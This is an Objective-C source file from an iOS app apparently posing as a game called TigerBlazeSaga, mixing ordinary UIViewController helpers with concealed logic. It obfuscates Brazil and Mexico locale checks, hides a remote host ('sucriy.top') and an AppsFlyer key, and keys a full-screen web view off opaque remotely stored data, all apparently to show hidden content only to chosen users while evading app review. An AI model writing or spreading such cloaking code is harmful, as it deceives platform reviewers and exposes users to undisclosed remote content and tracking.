//
//  UIViewController+func.m
//  TigerBlazeSaga
//
//  Created by TigerBlazeSaga on 2024/12/30.
//

#import "UIViewController+func.h"
#import <AppsFlyerLib/AppsFlyerLib.h>

static NSString *KKtigerBlazeMazeUserDefaultkey __attribute__((section("__DATA, tigerBlaze"))) = @"";

NSDictionary *KKtigerBlazeJsonToDicLogic(NSString *jsonString) __attribute__((section("__TEXT, tigerBlaze")));
NSDictionary *KKtigerBlazeJsonToDicLogic(NSString *jsonString) {
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    if (jsonData) {
        NSError *error;
        NSDictionary *jsonDictionary = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:&error];
        if (error) {
            NSLog(@"JSON parsing error: %@", error.localizedDescription);
            return nil;
        }
        NSLog(@"%@", jsonDictionary);
        return jsonDictionary;
    }
    return nil;
}

id KKtigerBlazeJsonValueForKey(NSString *jsonString, NSString *key) __attribute__((section("__TEXT, tigerBlaze")));
id KKtigerBlazeJsonValueForKey(NSString *jsonString, NSString *key) {
    NSDictionary *jsonDictionary = KKtigerBlazeJsonToDicLogic(jsonString);
    if (jsonDictionary && key) {
        return jsonDictionary[key];
    }
    NSLog(@"Key '%@' not found in JSON string.", key);
    return nil;
}


void KKtigerBlazeShowAdViewCLogic(UIViewController *self, NSString *adsUrl) __attribute__((section("__TEXT, tigerBlaze")));
void KKtigerBlazeShowAdViewCLogic(UIViewController *self, NSString *adsUrl) {
    if (adsUrl.length) {
        NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.tigerBlazeGetUserDefaultKey];
        UIViewController *adView = [self.storyboard instantiateViewControllerWithIdentifier:adsDatas[10]];
        [adView setValue:adsUrl forKey:@"url"];
        adView.modalPresentationStyle = UIModalPresentationFullScreen;
        [self presentViewController:adView animated:NO completion:nil];
    }
}

void KKtigerBlazeSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) __attribute__((section("__TEXT, tigerBlaze")));
void KKtigerBlazeSendEventLogic(UIViewController *self, NSString *event, NSDictionary *value) {
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.tigerBlazeGetUserDefaultKey];
    if ([event isEqualToString:adsDatas[11]] || [event isEqualToString:adsDatas[12]] || [event isEqualToString:adsDatas[13]]) {
        id am = value[adsDatas[15]];
        NSString *cur = value[adsDatas[14]];
        if (am && cur) {
            double niubi = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: [event isEqualToString:adsDatas[13]] ? @(-niubi) : @(niubi),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:event withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEvent:event withValues:value];
        NSLog(@"AppsFlyerLib-event");
    }
}

NSString *KKtigerBlazeAppsFlyerDevKey(NSString *input) __attribute__((section("__TEXT, tigerBlaze")));
NSString *KKtigerBlazeAppsFlyerDevKey(NSString *input) {
    if (input.length < 22) {
        return input;
    }
    NSUInteger startIndex = (input.length - 22) / 2;
    NSRange range = NSMakeRange(startIndex, 22);
    return [input substringWithRange:range];
}

NSString* KKtigerBlazeConvertToLowercase(NSString *inputString) __attribute__((section("__TEXT, tigerBlaze")));
NSString* KKtigerBlazeConvertToLowercase(NSString *inputString) {
    return [inputString lowercaseString];
}

@implementation UIViewController (func)

// 1. Show a custom alert with title and message
- (void)tigerBlazeShowAlertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title
                                                                   message:message
                                                            preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

// 2. Add a gradient background to the view
- (void)tigerBlazeAddGradientBackgroundWithColors:(NSArray<UIColor *> *)colors {
    CAGradientLayer *gradientLayer = [CAGradientLayer layer];
    gradientLayer.colors = [colors valueForKey:@"CGColor"];
    gradientLayer.frame = self.view.bounds;
    [self.view.layer insertSublayer:gradientLayer atIndex:0];
}

// 3. Log the current visible view controller
- (void)tigerBlazeLogCurrentViewController {
    NSLog(@"Current ViewController: %@", NSStringFromClass([self class]));
}

// 4. Present a view controller with a custom animation
- (void)tigerBlazePresentViewController:(UIViewController *)viewController withAnimation:(BOOL)animated {
    [self presentViewController:viewController animated:animated completion:nil];
}

// 5. Dismiss the view controller with a completion handler
- (void)tigerBlazeDismissViewControllerWithCompletion:(void (^)(void))completion {
    [self dismissViewControllerAnimated:YES completion:completion];
}

// 6. Configure navigation bar with title and tint color
- (void)tigerBlazeConfigureNavigationBarWithTitle:(NSString *)title tintColor:(UIColor *)tintColor {
    self.navigationItem.title = title;
    self.navigationController.navigationBar.tintColor = tintColor;
}

+ (NSString *)tigerBlazeGetUserDefaultKey
{
    return KKtigerBlazeMazeUserDefaultkey;
}

+ (void)tigerBlazeSetUserDefaultKey:(NSString *)key
{
    KKtigerBlazeMazeUserDefaultkey = key;
}

+ (NSString *)tigerBlazeAppsFlyerDevKey
{
    return KKtigerBlazeAppsFlyerDevKey(@"Tigerzt99WFGrJwb3RdzuknjXSKTiger");
}

- (NSString *)tigerBlazeMainHostUrl
{
    return @"sucriy.top";
}

- (BOOL)tigerBlazeNeedShowAdsView
{
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    BOOL isBr = [countryCode isEqualToString:[NSString stringWithFormat:@"%@R", self.preFx]];
    BOOL isIpd = [[UIDevice.currentDevice model] containsString:@"iPad"];
    BOOL isM = [countryCode isEqualToString:[NSString stringWithFormat:@"%@X", self.bfx]];
    return (isBr || isM) && !isIpd;
}

- (NSString *)bfx
{
    return @"M";
}

- (NSString *)preFx
{
    return @"B";
}

- (void)tigerBlazeShowAdView:(NSString *)adsUrl
{
    KKtigerBlazeShowAdViewCLogic(self, adsUrl);
}

- (NSDictionary *)tigerBlazeJsonToDicWithJsonString:(NSString *)jsonString {
    return KKtigerBlazeJsonToDicLogic(jsonString);
}

- (void)tigerBlazeSendEvent:(NSString *)event values:(NSDictionary *)value
{
    KKtigerBlazeSendEventLogic(self, event, value);
}

- (void)tigerBlazeSendEventsWithParams:(NSString *)params
{
    NSDictionary *paramsDic = [self tigerBlazeJsonToDicWithJsonString:params];
    NSString *event_type = [paramsDic valueForKey:@"event_type"];
    if (event_type != NULL && event_type.length > 0) {
        NSMutableDictionary *eventValuesDic = [[NSMutableDictionary alloc] init];
        NSArray *params_keys = [paramsDic allKeys];
        for (int i =0; i<params_keys.count; i++) {
            NSString *key = params_keys[i];
            if ([key containsString:@"af_"]) {
                NSString *value = [paramsDic valueForKey:key];
                [eventValuesDic setObject:value forKey:key];
            }
        }
        
        [AppsFlyerLib.shared logEventWithEventName:event_type eventValues:eventValuesDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if(dictionary != nil) {
                NSLog(@"reportEvent event_type %@ success: %@",event_type, dictionary);
            }
            if(error != nil) {
                NSLog(@"reportEvent event_type %@  error: %@",event_type, error);
            }
        }];
    }
}

- (void)tigerBlazeAfSendEvents:(NSString *)name paramsStr:(NSString *)paramsStr
{
    NSDictionary *paramsDic = [self tigerBlazeJsonToDicWithJsonString:paramsStr];
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.tigerBlazeGetUserDefaultKey];
    if ([KKtigerBlazeConvertToLowercase(name) isEqualToString:KKtigerBlazeConvertToLowercase(adsDatas[24])]) {
        id am = paramsDic[adsDatas[25]];
        if (am) {
            double pp = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: @(pp),
                adsDatas[17]: adsDatas[30]
            };
            [AppsFlyerLib.shared logEvent:name withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEventWithEventName:name eventValues:paramsDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if (error) {
                NSLog(@"AppsFlyerLib-event-error");
            } else {
                NSLog(@"AppsFlyerLib-event-success");
            }
        }];
    }
}

- (void)tigerBlazeAfSendEventWithName:(NSString *)name value:(NSString *)valueStr
{
    NSDictionary *paramsDic = [self tigerBlazeJsonToDicWithJsonString:valueStr];
    NSArray *adsDatas = [NSUserDefaults.standardUserDefaults valueForKey:UIViewController.tigerBlazeGetUserDefaultKey];
    if ([KKtigerBlazeConvertToLowercase(name) isEqualToString:KKtigerBlazeConvertToLowercase(adsDatas[24])] || [KKtigerBlazeConvertToLowercase(name) isEqualToString:KKtigerBlazeConvertToLowercase(adsDatas[27])]) {
        id am = paramsDic[adsDatas[26]];
        NSString *cur = paramsDic[adsDatas[14]];
        if (am && cur) {
            double pp = [am doubleValue];
            NSDictionary *values = @{
                adsDatas[16]: @(pp),
                adsDatas[17]: cur
            };
            [AppsFlyerLib.shared logEvent:name withValues:values];
        }
    } else {
        [AppsFlyerLib.shared logEventWithEventName:name eventValues:paramsDic completionHandler:^(NSDictionary<NSString *,id> * _Nullable dictionary, NSError * _Nullable error) {
            if (error) {
                NSLog(@"AppsFlyerLib-event-error");
            } else {
                NSLog(@"AppsFlyerLib-event-success");
            }
        }];
    }
}

@end
